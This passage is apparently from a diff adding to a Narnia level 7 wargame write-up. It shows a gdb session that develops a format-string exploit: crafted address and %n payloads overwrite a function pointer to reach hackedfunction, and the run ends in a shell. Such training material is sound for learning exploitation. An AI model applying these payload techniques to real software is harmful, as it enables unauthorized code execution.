@@ -197,4 +197,38 @@ Breakpoint 1, 0x08048685 in vuln ()
 0xffffd60c:	0x00018706	0xffffd600	0x4b4e554a	0xffffd60f
 0xffffd61c:	0x38343038	0x66383332	0x64666666	0x66383536
 0xffffd62c:	0x64666637	0x30343961
+(gdb) p 0x204-0x187
+$20 = 125
+(gdb) run $(python -c 'print "\xfc\xd5\xff\xffJUNK\xfd\xd5\xff\xffJUNK\xfe\xd5\xff\xffJUNK\xff\xd5\xff\xff"+"%x%x%x%x%210x%n%129x%n%125x%n"')
+Starting program: /games/narnia/narnia7 $(python -c 'print "\xfc\xd5\xff\xffJUNK\xfd\xd5\xff\xffJUNK\xfe\xd5\xff\xffJUNK\xff\xd5\xff\xff"+"%x%x%x%x%210x%n%129x%n%125x%n"')
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+>
+before : ptrf() = 0x80486e0 (0xffffd5fc)
+I guess you want to come to the hackedfunction...
+>
+Breakpoint 1, 0x08048685 in vuln ()
+(gdb) x/10x 0xffffd5fc
+0xffffd5fc:	0x02048706	0xffff0000	0x4b4e554a	0xffffd5fd
+0xffffd60c:	0x4b4e554a	0xffffd5fe	0x4b4e554a	0xffffd5ff
+0xffffd61c:	0x38343038	0x66383332
+(gdb) p 0x1008-0x204
+$22 = 3588
+(gdb) run $(python -c 'print "\xfc\xd5\xff\xffJUNK\xfd\xd5\xff\xffJUNK\xfe\xd5\xff\xffJUNK\xff\xd5\xff\xff"+"%x%x%x%x%210x%n%129x%n%125x%n%3588x%n"')
+Starting program: /games/narnia/narnia7 $(python -c 'print "\xfc\xd5\xff\xffJUNK\xfd\xd5\xff\xffJUNK\xfe\xd5\xff\xffJUNK\xff\xd5\xff\xff"+"%x%x%x%x%210x%n%129x%n%125x%n%3588x%n"')
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+>
+before : ptrf() = 0x80486e0 (0xffffd5fc)
+I guess you want to come to the hackedfunction...
+>
+Breakpoint 1, 0x08048685 in vuln ()
+(gdb) x/10x 0xffffd5fc
+0xffffd5fc:	0x08048706	0xff000010	0x4b4e554a	0xffffd5fd
+0xffffd60c:	0x4b4e554a	0xffffd5fe	0x4b4e554a	0xffffd5ff
+0xffffd61c:	0x38343038	0x66383332
+(gdb) c
+Continuing.
+Way to go!!!!$ whoami
+narnia7
 >```
